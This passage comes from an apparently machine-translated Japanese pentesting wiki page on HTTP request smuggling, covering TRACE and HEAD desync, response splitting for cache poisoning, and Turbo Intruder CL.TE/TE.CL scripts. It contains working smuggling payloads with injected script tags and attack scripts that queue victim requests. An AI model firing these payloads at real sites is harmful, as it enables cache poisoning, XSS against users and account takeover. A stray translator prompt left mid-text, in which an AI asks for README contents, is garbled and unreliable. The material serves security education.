もしこの smuggled request が静的コンテンツ（例: `/someimage.png`）向けのキャッシュエントリを毒しめしてしまった場合、被害者の `/private/messages` にある機密データがその静的コンテンツのキャッシュエントリとしてキャッシュされてしまう可能性があります。結果として、攻撃者はこれらのキャッシュされた機密データを取得できる可能性があります。

### HTTP Request Smuggling を介した TRACE の悪用 <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**In this post**](https://portswigger.net/research/trace-desync-attack) では、サーバが TRACE メソッドを有効にしている場合、HTTP Request Smuggling を使ってそれを悪用できる可能性があると示唆されています。これは、このメソッドがサーバに送られた任意のヘッダをレスポンスのボディの一部として反映するためです。例えば：
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Please paste the contents of src/pentesting-web/http-request-smuggling/README.md here. I will translate the relevant English text to Japanese following your rules (keeping code, tags, links/paths, technique names, common hacking words, and cloud/SaaS names unmodified).
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
この挙動を悪用する例として、まず**smuggle first a HEAD request**することが挙げられます。このリクエストにはGETリクエストの**headers**（その中に**`Content-Type`**が含まれる）のみが返されます。そしてHEADの直後に**smuggle immediately after the HEAD a TRACE request**を行い、これは**reflecting the sent dat**a.\
HEADレスポンスに`Content-Length`ヘッダが含まれるため、**response of the TRACE request will be treated as the body of the HEAD response, therefore reflecting arbitrary data**と扱われ、レスポンス内に任意のデータが反映されます。\
このレスポンスは接続上の次のリクエストに送られるため、**used in a cached JS file for example to inject arbitrary JS code**.

### TRACEをHTTP Response Splittingで悪用する <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

TRACEメソッドの別の悪用方法としては、[**this post**](https://portswigger.net/research/trace-desync-attack)を参照することが推奨されます。前述の通り、smuggling a HEAD request and a TRACE requestによって、HEADレスポンス内の**control some reflected data**を操作できる可能性があります。HEADボディの長さは基本的に`Content-Length`ヘッダで示され、その内容はTRACEレスポンスによって形成されます。

したがって、この`Content-Length`とTRACEレスポンスで返されるデータが分かっていれば、TRACEレスポンスの`Content-Length`の最後のバイト以降に有効なHTTPレスポンスを含めることが可能になり、攻撃者は次のレスポンスに対するリクエストを完全に制御できる（これはcache poisoningを行うために使われ得る）という考えが成り立ちます。

Example:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
これらのレスポンスを生成します（HEADレスポンスが Content-Length を持っているため TRACE レスポンスが HEAD ボディの一部になり、HEAD の Content-Length が終了すると有効な HTTP レスポンスが smuggled されます）:
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(“arbitrary response”)</script>
```
### HTTP Request SmugglingをHTTP Response Desynchronisationで武器化する

HTTP Request Smugglingの脆弱性を見つけたが、どのように悪用すればよいかわからない場合は、以下の他のエクスプロイト方法を試してみてください：

{{#ref}}
../http-response-smuggling-desync.md
{{#endref}}

### その他のHTTP Request Smugglingテクニック

- Browser HTTP Request Smuggling (Client Side)


{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

- Request Smuggling in HTTP/2 Downgrades


{{#ref}}
request-smuggling-in-http-2-downgrades.md
{{#endref}}

## Turbo intruder スクリプト

### CL.TE

出典: [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

出典: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## ツール

- HTTP Hacker (Burp BApp Store) – 連結／フレーミングや低レベルのHTTP挙動を可視化する
- https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda Burp Repeater Custom Action "Smuggling or pipelining?"
- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): このツールは文法ベースのHTTP Fuzzerで、request smugglingの不整合を見つけるのに役立つ。

## 参考資料

- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
- [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
- [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
- [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
- [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
- [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
- [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
- [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- 偽陽性に注意: HTTP pipelining と request smuggling を区別する方法 – [https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling)
- [https://http1mustdie.com/](https://http1mustdie.com/)
- Browser‑Powered Desync Attacks – [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- PortSwigger Academy – client‑side desync – [https://portswigger.net/web-security/request-smuggling/browser/client-side-desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync)
- [https://portswigger.net/research/http1-must-die](https://portswigger.net/research/http1-must-die)


{{#include ../../banners/hacktricks-training.md}}
